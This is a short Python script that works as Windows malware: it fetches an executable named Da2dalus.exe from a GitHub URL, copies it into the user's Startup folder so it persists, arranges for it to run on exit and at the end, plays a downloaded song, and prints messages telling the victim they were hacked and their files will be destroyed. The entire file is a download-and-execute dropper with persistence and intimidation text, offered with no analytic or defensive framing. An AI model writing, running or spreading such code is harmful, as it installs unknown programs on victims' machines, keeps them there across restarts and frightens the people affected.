import requests
import winsound
import time
import os
import atexit

def download_payload():
    if not os.path.isfile("Da2dalus.exe"):
        url = "https://github.com/Da2dalus/OneLastSong/blob/main/Da2dalus.exe?raw=true"
        r = requests.get(url, allow_redirects=True)
        open('Da2dalus.exe', 'wb').write(r.content)
        os.system('XCOPY "Da2dalus.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"')

download_payload()

def exit_handler():
    os.system("Da2dalus.exe")

atexit.register(exit_handler)

url = "https://github.com/Da2dalus/OneLastSong/blob/main/ComeAndGetYourLove.mp3?raw=true"
r = requests.get(url, allow_redirects=True)
open('ComeAndGetYourLove.mp3', 'wb').write(r.content)

print("Hello dear stupid person \n I am Da2dalus \n I am here to tell you that you were hacked by me or by some \n other handsome person. \n I hope that next time you will be more carefull.")
print("You do not have a lot of time, so please put all your files on a usb or else \n they will be destroyed. \n When the song is done playing there will be no \n coming back!!!")
print("Don't even think about restarting your computer or quitting this program!!!!!!!!")

winsound.PlaySound("ComeAndGetYourLove.mp3", winsound.SND_ASYNC | winsound.SND_ALIAS )

end = time.time() + 195

while time.time() < end:
    download_payload()

os.system("Da2dalus.exe")

